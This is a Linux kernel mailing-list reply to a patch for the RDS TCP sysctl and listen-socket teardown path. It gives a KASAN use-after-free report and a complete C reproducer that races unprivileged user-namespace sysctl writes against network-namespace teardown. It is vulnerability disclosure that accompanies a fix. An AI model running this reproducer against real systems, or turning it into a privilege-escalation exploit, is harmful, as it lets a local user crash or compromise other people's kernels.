Received: from mail-yw1-f180.google.com (mail-yw1-f180.google.com [209.85.128.180])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 1EB3724E4A1
	for <linux-rdma@vger.kernel.org>; Sun, 19 Jul 2026 20:37:20 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.128.180
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1784493441; cv=none; b=uj79U9EiJwAALvMOxwKB3BK3pB+rBTKWpCR4LffdE5dtAypbd01Q1ZPoEZnHBZ8pXEq9kK8uw0HyeQ1gu70xwAu2E29dmAVoHKc+/GpSqBp0gIn7lGvmXiyECS1U9J9xWjJ7XWjtPs6XuTMghCoeIMc07rZHegXJ/ieke5MJ+yU=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1784493441; c=relaxed/simple;
	bh=zlXTcdm1Eobmx/ABw/l8X4K1cugckTh+Me9W8v0l8Rc=;
	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
	 MIME-Version; b=Z+zyqUeOiNefbC0J5CNSCLF2eW8UZ8SZbRFyAeUoybnp6qL3uQ01A+iwTSEVPWpeUVV1/+WO2RfbToKWB7pW4chMtqFiaD3MD6VzGtBtfNudJ04+yWHv/hJbiLgGvtVzqMwjekIFrTT4DNbqCCjAffrFVZUFps4lg270I/LrIOg=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=Kp1XkEv+; arc=none smtp.client-ip=209.85.128.180
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="Kp1XkEv+"
Received: by mail-yw1-f180.google.com with SMTP id 00721157ae682-80cebd41372so86553217b3.3
        for <linux-rdma@vger.kernel.org>; Sun, 19 Jul 2026 13:37:20 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1784493439; x=1785098239; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:references:in-reply-to
         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=41Rd+yUmrzI8ozU6x6qNA9ggJjoHwdWXcunZ4xwS5wM=;
        b=Kp1XkEv+ziRHf7kAvu2+PzlhNVEVGukjs6sfrOj+DqtBOje7EAbF3hgFjXkXBSGBxo
         tKyTEwzbs73t5VQLkr4AV0eq+hYd1RHCMXs4zeMLpdG9Yd3/ORZTzO7AZscZcWa9jK6+
         q6uzKsgihurf004rmFufrsaNMDWnA4N3zsBtkRMnd/Ucj0Udq17w7uEoZIY9fz9dESle
         pJ7ERJLzhHc4vF2jKSrYweotEkGXHXHQTWSzhrnFwmIy81z5xt8XKTakDBHk2HUU6SId
         SrxhkGXoxQqVYnicj77f2VM3QlK277lEmC/svnR3ZX7SUs6iSVBwNK7exGkg2IQpXikq
         0KZw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1784493439; x=1785098239;
        h=content-transfer-encoding:mime-version:references:in-reply-to
         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to:content-type;
        bh=41Rd+yUmrzI8ozU6x6qNA9ggJjoHwdWXcunZ4xwS5wM=;
        b=QUMVhW8TJaZClDlIep3B7a8KKlkTdS88goZObrR9RF7GOFzw1dOLwshaA6cO0RBxQg
         ijw95vpGM/Tiav2kKTUmGMbaB3V+g1Yv3Y1yx519MvYm0r8ekIxUXrhi2oro5cD1bkCP
         82Cdc7PxJfK2UrEHz733NQh+8qFdIETQnpMAN2En3+C9JkPy3u+JMLngNhhSy7Yr09ws
         ru/aG5Y4ngfhodgqms6N4f4TttEon0RDZxok/rXwnsE7UGMacZMKA8BsyntTQTMsdLmV
         czIzgezb8E172rSrpTuwUtfi1/T5If9PXLW84ZTS70V6Gsbf0N5THfElxMA/BELhAL1j
         /pug==
X-Forwarded-Encrypted: i=1; AHgh+RqdLDeK6hyMu3iEfsEDtRLnjiqQQEyDIv0VABYkP0ZwrGxJUZgTAIlaaZRFjyz0fiE3Et1c4Aa4aUiR@vger.kernel.org
X-Gm-Message-State: AOJu0YwWjfoN5zs7s4nLI1Q4/JSS33pE5UfBNv9+6mwwCW+iX9aq8lCq
	uOuEaRQb3drpRZRusH07rYT/Uip4cpibOcn62t50bgKULJmijF2RbBUg
X-Gm-Gg: AfdE7ckOKFzZLQf+nZtOH/i+LHqa4yB4QMCVsuF+YOh5k/w4Yl7YBKvlis/fOQQhLAC
	/HUqBxn2QIujDawy75i2AVtOve8Ir0QoztzAYQjFqhTpRpsAvQrsG1aSQtM9Kl7qoO3w+URBInG
	hRoJY2RWNKSiQ50E8Sit46hf51nnaed0K6Q/eT0rfgocJQ9YqMI7221XQfCh779b0Sva3acxDnJ
	uZeBrCVJnG1+vSwWvFXVQ+A1CS5cYNUyMhaXTSslJZ6V9JpBzxVgCeqAOHUCefNGKwjQU9HSt+e
	5c96sb3M3b2QeL7SmslTAXIx1dx7YmdcdG5IkqlJ+koQFQuvf+8C4Bs5/NOofoNUN5SLsnEkION
	YaL6a8gdb+pdJZ0oww61xbxE+DArGSpjZphfdUDifmkD1b5m/r87E72fAjA3NeLc0447gCiAA3s
	Z7Q/A6ML+L7/dtT64vHXs9pSPNmheaOT3zDd1BBuwhASoAClSsayX+im+3TSL5SeVBSzmcnlVp/
	B9FqP0zVs2TZw==
X-Received: by 2002:a05:690c:b98:b0:80b:ad04:aaf5 with SMTP id 00721157ae682-81ef26481b3mr39139707b3.51.1784493438939;
        Sun, 19 Jul 2026 13:37:18 -0700 (PDT)
Received: from LAPTOP-83ECOPAB.f7a5e5c3-cab1-4810-bdbb-207cdd06de9e.globalsecureaccess.local ([136.55.173.105])
        by smtp.gmail.com with ESMTPSA id 00721157ae682-81ef4033935sm43461277b3.11.2026.07.19.13.37.18
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 19 Jul 2026 13:37:18 -0700 (PDT)
From: "Cen Zhang (Microsoft)" <blbllhy@gmail.com>
To: achender@kernel.org
Cc: AutonomousCodeSecurity@microsoft.com,
	blbllhy@gmail.com,
	davem@davemloft.net,
	edumazet@google.com,
	horms@kernel.org,
	kuba@kernel.org,
	kys@microsoft.com,
	linux-kernel@vger.kernel.org,
	linux-rdma@vger.kernel.org,
	netdev@vger.kernel.org,
	pabeni@redhat.com,
	rds-devel@oss.oracle.com,
	tgopinath@linux.microsoft.com
Subject: Re: [PATCH net] rds: tcp: unregister sysctl before tearing down listen socket
Date: Sun, 19 Jul 2026 16:37:18 -0400
Message-ID: <20260719203718.9680-1-blbllhy@gmail.com>
X-Mailer: git-send-email 2.53.0
In-Reply-To: <ae36eabfd58a08a340be7a988af6edaba9dd683a.camel@kernel.org>
References: <ae36eabfd58a08a340be7a988af6edaba9dd683a.camel@kernel.org>
Precedence: bulk
X-Mailing-List: linux-rdma@vger.kernel.org
List-Id: <linux-rdma.vger.kernel.org>
List-Subscribe: <mailto:linux-rdma+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-rdma+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Here is the observed KASAN report and the reproducer used to trigger it.

KASAN report:

```
[   23.409360] ==================================================================
[   23.410774] BUG: KASAN: slab-use-after-free in rds_tcp_skbuf_handler+0x2aa/0x2e0
[   23.412207] Read of size 8 at addr ffff88800de20ab0 by task exploit/959
[   23.413472] 
[   23.413814] CPU: 1 UID: 1000 PID: 959 Comm: exploit Not tainted 7.2.0-rc3+ #1 PREEMPTLAZY 
[   23.413833] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   23.413844] Call Trace:
[   23.413849]  <TASK>
[   23.413855]  dump_stack_lvl+0x8c/0xb0
[   23.413876]  print_report+0xce/0x630
[   23.413913]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
[   23.413932]  ? irqentry_exit+0x163/0x7b0
[   23.413956]  ? rds_tcp_skbuf_handler+0x2aa/0x2e0
[   23.413974]  kasan_report+0xce/0x100
[   23.414000]  ? rds_tcp_skbuf_handler+0x2aa/0x2e0
[   23.414021]  rds_tcp_skbuf_handler+0x2aa/0x2e0
[   23.414041]  proc_sys_call_handler+0x4d7/0x710
[   23.414060]  ? __pfx_proc_sys_call_handler+0x10/0x10
[   23.414077]  ? srso_return_thunk+0x5/0x5f
[   23.414103]  ? security_file_permission+0xb2/0x1b0
[   23.414130]  ? srso_return_thunk+0x5/0x5f
[   23.414155]  ? rw_verify_area+0xa0/0x4c0
[   23.414172]  vfs_write+0x644/0xca0
[   23.414193]  ? __pfx_proc_sys_write+0x10/0x10
[   23.414210]  ? __pfx_vfs_write+0x10/0x10
[   23.414238]  __x64_sys_pwrite64+0x1be/0x220
[   23.414261]  ? __pfx___x64_sys_pwrite64+0x10/0x10
[   23.414283]  ? srso_return_thunk+0x5/0x5f
[   23.414308]  ? restore_fpregs_from_fpstate+0x46/0xd0
[   23.414333]  do_syscall_64+0xde/0x570
[   23.414353]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
[   23.414370] RIP: 0033:0x41e1fd
[   23.414381] Code: b3 66 2e 0f 1f 84 00 00 00 00 00 66 90 f3 0f 1e fa 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 c0 ff ff ff f7 d8 64 89 01 48
[   23.414412] RSP: 002b:00007ffef5d0e078 EFLAGS: 00000246 ORIG_RAX: 0000000000000012
[   23.414428] RAX: ffffffffffffffda RBX: 00000000004880f2 RCX: 000000000041e1fd
[   23.414439] RDX: 0000000000000008 RSI: 00000000004880f2 RDI: 0000000000000004
[   23.414448] RBP: 0000000000000004 R08: 0000000015791fc0 R09: 0000000015791fc0
[   23.414458] R10: 0000000000000000 R11: 0000000000000246 R12: 00000000ffffffff
[   23.414468] R13: 0000000015792b30 R14: 0000000000000010 R15: 0000000015792b30
[   23.414483]  </TASK>
[   23.414488] 
[   23.451099] Allocated by task 947:
[   23.452185] 
[   23.452528] Freed by task 949:
[   23.453368] 
[   23.453714] Last potentially related work creation:
[   23.454847] 
[   23.455184] Second to last potentially related work creation:
[   23.456735] 
[   23.457071] The buggy address belongs to the object at ffff88800de20a80
[   23.457071]  which belongs to the cache TCPv6 of size 2560
[   23.459313] The buggy address is located 48 bytes inside of
[   23.459313]  freed 2560-byte region [ffff88800de20a80, ffff88800de21480)
[   23.461621] 
[   23.461962] The buggy address belongs to the physical page:
[   23.463215] 
[   23.463560] Memory state around the buggy address:
[   23.464503]  ffff88800de20980: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[   23.465893]  ffff88800de20a00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[   23.467284] >ffff88800de20a80: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[   23.468678]                                      ^
[   23.469623]  ffff88800de20b00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[   23.471021]  ffff88800de20b80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[   23.472413] ==================================================================
```

Reproducer code:

```
/*
 * Controlled RDS TCP sysctl/netns teardown race reproducer.
 *
 * Mental model:
 *
 *   target netns child:
 *     creates the target netns, initializes RDS TCP, opens the target sysctl fd,
 *     sends that fd to the parent, then waits.  While it waits, the target
 *     netns and its rtn->rds_tcp_listen_sock are alive.
 *
 *   writer children:
 *     wait on a parent-controlled start barrier, then tight-loop pwrite64()
 *     the target sysctl fd.  Each pwrite enters rds_tcp_skbuf_handler().
 *
 *   parent:
 *     starts writers first, then releases the target child.  The child exits,
 *     making the target netns tear down while writers are still in/around the
 *     sysctl handler.
 *
 * Trigger condition:
 *
 *   writer has entered rds_tcp_skbuf_handler() and is using
 *   rtn->rds_tcp_listen_sock while target netns teardown runs:
 *
 *     rds_tcp_exit_net()
 *       -> rds_tcp_kill_sock()
 *            -> rds_tcp_listen_stop()
 *                 -> sock_release(rtn->rds_tcp_listen_sock)
 *
 * On a vulnerable KASAN kernel this reports a UAF in rds_tcp_skbuf_handler().
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef AF_RDS
#define AF_RDS 21
#endif

#define RDS_TCP_SNDBUF_SYSCTL "/proc/sys/net/rds/tcp/rds_tcp_sndbuf"
#define SYSCTL_VALUE "1048576\n"

#define DEFAULT_ROUNDS 1000
#define DEFAULT_WRITERS 16
#define DEFAULT_PRE_TEARDOWN_US 1000
#define DEFAULT_POST_TEARDOWN_US 200000

struct run_config {
	int rounds;
	int writers;
	int pre_teardown_us;
	int post_teardown_us;
	int writer_cpu;
};

static void die(const char *msg)
{
	perror(msg);
	exit(1);
}

static void checked_write_file(const char *path, const char *s)
{
	int fd = open(path, O_WRONLY | O_CLOEXEC);

	if (fd < 0)
		die(path);
	if (write(fd, s, strlen(s)) != (ssize_t)strlen(s))
		die(path);
	close(fd);
}

static void become_root_in_new_userns(void)
{
	char map[128];
	uid_t uid = getuid();
	gid_t gid = getgid();

	if (unshare(CLONE_NEWUSER))
		die("unshare(CLONE_NEWUSER)");

	snprintf(map, sizeof(map), "0 %u 1\n", uid);
	checked_write_file("/proc/self/uid_map", map);
	checked_write_file("/proc/self/setgroups", "deny\n");
	snprintf(map, sizeof(map), "0 %u 1\n", gid);
	checked_write_file("/proc/self/gid_map", map);
}

static void touch_rds_tcp_transport(void)
{
	int fd = socket(AF_RDS, SOCK_SEQPACKET, 0);

	if (fd >= 0)
		close(fd);
}

static void send_fd_over_unix_socket(int unix_sock, int fd_to_send)
{
	char byte = 0;
	char control[CMSG_SPACE(sizeof(fd_to_send))];
	struct iovec iov = { .iov_base = &byte, .iov_len = sizeof(byte) };
	struct msghdr msg = {
		.msg_iov = &iov,
		.msg_iovlen = 1,
		.msg_control = control,
		.msg_controllen = sizeof(control),
	};
	struct cmsghdr *cmsg;

	memset(control, 0, sizeof(control));
	cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_SOCKET;
	cmsg->cmsg_type = SCM_RIGHTS;
	cmsg->cmsg_len = CMSG_LEN(sizeof(fd_to_send));
	memcpy(CMSG_DATA(cmsg), &fd_to_send, sizeof(fd_to_send));

	if (sendmsg(unix_sock, &msg, 0) < 0)
		die("sendmsg(SCM_RIGHTS)");
}

static int recv_fd_over_unix_socket(int unix_sock)
{
	int received_fd = -1;
	char byte;
	char control[CMSG_SPACE(sizeof(received_fd))];
	struct iovec iov = { .iov_base = &byte, .iov_len = sizeof(byte) };
	struct msghdr msg = {
		.msg_iov = &iov,
		.msg_iovlen = 1,
		.msg_control = control,
		.msg_controllen = sizeof(control),
	};
	struct cmsghdr *cmsg;

	memset(control, 0, sizeof(control));
	if (recvmsg(unix_sock, &msg, 0) <= 0)
		return -1;

	cmsg = CMSG_FIRSTHDR(&msg);
	if (!cmsg || cmsg->cmsg_level != SOL_SOCKET || cmsg->cmsg_type != SCM_RIGHTS)
		return -1;

	memcpy(&received_fd, CMSG_DATA(cmsg), sizeof(received_fd));
	return received_fd;
}

static void target_netns_child(int parent_control_sock)
{
	int sysctl_fd;
	char release_byte;

	if (unshare(CLONE_NEWNET))
		_exit(2);

	touch_rds_tcp_transport();

	sysctl_fd = open(RDS_TCP_SNDBUF_SYSCTL, O_RDWR | O_CLOEXEC);
	if (sysctl_fd < 0)
		_exit(3);

	send_fd_over_unix_socket(parent_control_sock, sysctl_fd);
	close(sysctl_fd);

	/*
	 * The parent writes one byte here to make this process exit.
	 * That exit is the explicit trigger for target netns teardown.
	 */
	(void)read(parent_control_sock, &release_byte, 1);
	_exit(0);
}

static void maybe_pin_to_cpu(int cpu)
{
	cpu_set_t set;

	if (cpu < 0)
		return;

	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	(void)sched_setaffinity(0, sizeof(set), &set);
}

static void writer_child(int sysctl_fd, int start_barrier_fd, int cpu)
{
	char start_byte;

	maybe_pin_to_cpu(cpu);

	/* Parent releases this barrier after all writers have been forked. */
	(void)read(start_barrier_fd, &start_byte, 1);

	for (;;)
		(void)syscall(SYS_pwrite64, sysctl_fd, SYSCTL_VALUE,
			      sizeof(SYSCTL_VALUE) - 1, 0);
}

static void start_all_writers(int barrier_write_fd, int writer_count)
{
	for (int i = 0; i < writer_count; i++)
		(void)write(barrier_write_fd, "s", 1);
}

static void stop_and_reap_writers(pid_t *writer_pids, int writer_count)
{
	for (int i = 0; i < writer_count; i++)
		kill(writer_pids[i], SIGKILL);
	for (int i = 0; i < writer_count; i++)
		waitpid(writer_pids[i], NULL, 0);
}

static int run_one_race_round(const struct run_config *cfg, int round)
{
	int control_sock[2];
	int writer_start_pipe[2];
	int target_sysctl_fd;
	pid_t target_pid;
	pid_t *writer_pids = calloc((size_t)cfg->writers, sizeof(*writer_pids));

	if (!writer_pids)
		die("calloc(writer_pids)");
	if (socketpair(AF_UNIX, SOCK_DGRAM, 0, control_sock))
		die("socketpair(target control)");
	if (pipe(writer_start_pipe))
		die("pipe(writer start)");

	target_pid = fork();
	if (target_pid < 0)
		die("fork(target netns child)");
	if (target_pid == 0) {
		close(control_sock[0]);
		close(writer_start_pipe[0]);
		close(writer_start_pipe[1]);
		target_netns_child(control_sock[1]);
	}
	close(control_sock[1]);

	target_sysctl_fd = recv_fd_over_unix_socket(control_sock[0]);
	if (target_sysctl_fd < 0) {
		(void)write(control_sock[0], "x", 1);
		waitpid(target_pid, NULL, 0);
		close(control_sock[0]);
		close(writer_start_pipe[0]);
		close(writer_start_pipe[1]);
		free(writer_pids);
		return -1;
	}

	for (int i = 0; i < cfg->writers; i++) {
		writer_pids[i] = fork();
		if (writer_pids[i] < 0)
			die("fork(writer child)");
		if (writer_pids[i] == 0) {
			close(control_sock[0]);
			close(writer_start_pipe[1]);
			writer_child(target_sysctl_fd, writer_start_pipe[0], cfg->writer_cpu);
		}
	}

	close(writer_start_pipe[0]);

	/*
	 * Controlled sequence:
	 *   1. Start writers.
	 *   2. Let them hammer the sysctl handler.
	 *   3. Release target child, which triggers netns teardown.
	 *   4. Keep writers running while teardown frees the listen socket.
	 */
	start_all_writers(writer_start_pipe[1], cfg->writers);
	close(writer_start_pipe[1]);

	usleep((useconds_t)cfg->pre_teardown_us);
	(void)write(control_sock[0], "q", 1);
	usleep((useconds_t)cfg->post_teardown_us);

	stop_and_reap_writers(writer_pids, cfg->writers);
	waitpid(target_pid, NULL, 0);

	close(target_sysctl_fd);
	close(control_sock[0]);
	free(writer_pids);

	if ((round & 15) == 0)
		printf("round %d\n", round);

	return 0;
}

static struct run_config parse_config(int argc, char **argv)
{
	struct run_config cfg = {
		.rounds = argc > 1 ? atoi(argv[1]) : DEFAULT_ROUNDS,
		.writers = argc > 2 ? atoi(argv[2]) : DEFAULT_WRITERS,
		.pre_teardown_us = argc > 3 ? atoi(argv[3]) : DEFAULT_PRE_TEARDOWN_US,
		.post_teardown_us = argc > 4 ? atoi(argv[4]) : DEFAULT_POST_TEARDOWN_US,
		.writer_cpu = argc > 5 ? atoi(argv[5]) : -1,
	};

	if (cfg.rounds < 1)
		cfg.rounds = DEFAULT_ROUNDS;
	if (cfg.writers < 1)
		cfg.writers = DEFAULT_WRITERS;
	if (cfg.pre_teardown_us < 0)
		cfg.pre_teardown_us = DEFAULT_PRE_TEARDOWN_US;
	if (cfg.post_teardown_us < 1)
		cfg.post_teardown_us = DEFAULT_POST_TEARDOWN_US;

	return cfg;
}

int main(int argc, char **argv)
{
	struct run_config cfg = parse_config(argc, argv);

	setbuf(stdout, NULL);
	signal(SIGPIPE, SIG_IGN);

	become_root_in_new_userns();
	touch_rds_tcp_transport();

	printf("controlled RDS TCP sysctl race: rounds=%d writers=%d pre=%dus post=%dus writer_cpu=%d\n",
	       cfg.rounds, cfg.writers, cfg.pre_teardown_us,
	       cfg.post_teardown_us, cfg.writer_cpu);

	for (int round = 0; round < cfg.rounds; round++)
		(void)run_one_race_round(&cfg, round);

	return 0;
}
```
